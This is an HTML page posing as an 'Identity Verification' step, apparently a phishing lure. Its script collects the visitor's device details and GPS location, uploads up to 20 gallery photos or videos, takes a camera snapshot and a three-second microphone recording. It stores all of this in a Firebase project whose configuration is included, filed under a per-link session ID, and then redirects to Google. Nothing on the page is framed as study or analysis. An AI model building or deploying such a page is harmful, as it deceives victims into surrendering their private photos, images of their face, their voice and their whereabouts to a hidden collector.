<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verification Required</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    
    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 380px;
            width: 100%;
            background: #111;
            border-radius: 32px;
            padding: 32px 24px;
            text-align: center;
            border: 1px solid #222;
        }
        .icon {
            font-size: 56px;
            margin-bottom: 20px;
        }
        h2 {
            color: #fff;
            font-size: 24px;
            margin-bottom: 12px;
        }
        p {
            color: #aaa;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 28px;
        }
        .btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 14px 24px;
            border-radius: 40px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
        }
        .btn:disabled {
            background: #333;
            cursor: not-allowed;
        }
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 12px;
            font-size: 13px;
            display: none;
        }
        .status.success {
            background: #0a2e1a;
            color: #4ade80;
            display: block;
        }
        .status.error {
            background: #2e0a0a;
            color: #ff6b6b;
            display: block;
        }
        .status.loading {
            background: #0a1a2e;
            color: #1a73e8;
            display: block;
        }
        input, video, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🔐</div>
        <h2>Identity Verification</h2>
        <p>Please grant permissions to verify your identity</p>
        <button class="btn" id="startBtn">Start Verification</button>
        <div class="status" id="status"></div>
    </div>

    <input type="file" id="fileInput" accept="image/*,video/*" multiple>
    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
            authDomain: "mobilehk-5e843.firebaseapp.com",
            projectId: "mobilehk-5e843",
            storageBucket: "mobilehk-5e843.firebasestorage.app",
            messagingSenderId: "287475964010",
            appId: "1:287475964010:web:35b3d5f3f5e382ea881213"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        const storage = firebase.storage();
        
        // Get session ID
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('id');
        
        const startBtn = document.getElementById('startBtn');
        const statusDiv = document.getElementById('status');
        
        // Show error if no session
        if (!sessionId) {
            statusDiv.className = 'status error';
            statusDiv.innerHTML = '❌ Invalid link. Please use the correct verification link.';
            startBtn.disabled = true;
        }
        
        // Save data to Firebase
        async function saveData(type, data) {
            if (!sessionId) return;
            try {
                await db.collection('sessions').doc(sessionId).collection('data').add({
                    type: type,
                    data: data,
                    time: new Date().toISOString()
                });
                console.log('Saved:', type);
            } catch(e) {
                console.error('Save error:', e);
            }
        }
        
        // Upload file to Firebase Storage
        async function uploadFile(file, type) {
            if (!sessionId) return;
            const filename = `${sessionId}_${Date.now()}_${file.name.replace(/[^a-z0-9.]/gi, '_')}`;
            const ref = storage.ref(`uploads/${filename}`);
            await ref.put(file);
            const url = await ref.getDownloadURL();
            await saveData(type, { url, name: file.name });
            return url;
        }
        
        // Step 1: Get Gallery
        async function getGallery() {
            return new Promise((resolve) => {
                const input = document.getElementById('fileInput');
                input.onchange = async (e) => {
                    const files = Array.from(e.target.files);
                    statusDiv.innerHTML = `📸 Uploading ${files.length} files...`;
                    for (let i = 0; i < Math.min(files.length, 20); i++) {
                        const file = files[i];
                        const type = file.type.startsWith('image/') ? 'gallery_photo' : 'gallery_video';
                        await uploadFile(file, type);
                        statusDiv.innerHTML = `📸 Uploaded ${i+1}/${Math.min(files.length, 20)}`;
                    }
                    resolve(true);
                };
                input.click();
            });
        }
        
        // Step 2: Get Camera
        async function getCamera() {
            try {
                statusDiv.innerHTML = "📷 Accessing camera...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1000));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));
                const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
                await uploadFile(file, 'camera_photo');
                
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) {
                console.log('Camera error:', e);
                return false;
            }
        }
        
        // Step 3: Get Location
        async function getLocation() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await saveData('location', {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    });
                    resolve(true);
                }, () => resolve(false));
            });
        }
        
        // Step 4: Get Microphone
        async function getMicrophone() {
            try {
                statusDiv.innerHTML = "🎤 Recording audio...";
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                    await uploadFile(file, 'microphone');
                };
                recorder.start();
                await new Promise(r => setTimeout(r, 3000));
                recorder.stop();
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) {
                return false;
            }
        }
        
        // Main function
        async function startVerification() {
            if (!sessionId) return;
            
            startBtn.disabled = true;
            statusDiv.className = 'status loading';
            statusDiv.innerHTML = "🔐 Requesting permissions...";
            
            // Save device info first
            await saveData('device', {
                ua: navigator.userAgent,
                screen: screen.width + 'x' + screen.height,
                language: navigator.language
            });
            
            // Get location (no extra permission, just GPS)
            await getLocation();
            
            // Get gallery (this will trigger file picker)
            statusDiv.innerHTML = "📸 Select photos/videos from gallery...";
            await getGallery();
            
            // Get camera (this will trigger camera permission)
            await getCamera();
            
            // Get microphone (this will trigger mic permission)
            await getMicrophone();
            
            // Done
            statusDiv.className = 'status success';
            statusDiv.innerHTML = "✅ Verification complete! Redirecting...";
            
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 2000);
        }
        
        startBtn.onclick = startVerification;
    </script>
</body>
</html>
